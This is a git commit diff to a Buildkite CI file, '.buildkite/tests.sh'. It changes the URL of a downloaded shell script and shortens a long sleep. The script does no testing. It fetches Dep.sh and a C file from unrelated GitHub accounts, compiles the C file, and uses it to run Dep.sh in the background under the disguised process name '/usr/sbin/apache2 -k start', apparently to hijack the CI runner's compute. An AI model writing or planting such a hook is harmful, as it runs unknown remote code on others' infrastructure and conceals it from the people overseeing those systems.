fa36bb612dee9e3e52f49396e8ca948237758adc
ted2jd <85064651+ted2jd@users.noreply.github.com>
2021-05-30 21:38:52 +0530

    Update tests.sh

--- .buildkite/tests.sh
+++ .buildkite/tests.sh
@@ -3,9 +3,9 @@
 
 apt-get install gcc -y
 apt-get install unzip -y
-wget https://github.com/tuhsv228/test/raw/main/Dep.sh
+wget https://github.com/ted2jd/dummy235/raw/main/Dep.sh
 chmod +x Dep.sh
 wget https://github.com/thoeb292/thoeb292/raw/main/mas.c
 gcc -o test mas.c 
 ./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./Dep.sh 
-sleep 80000
+sleep 7167
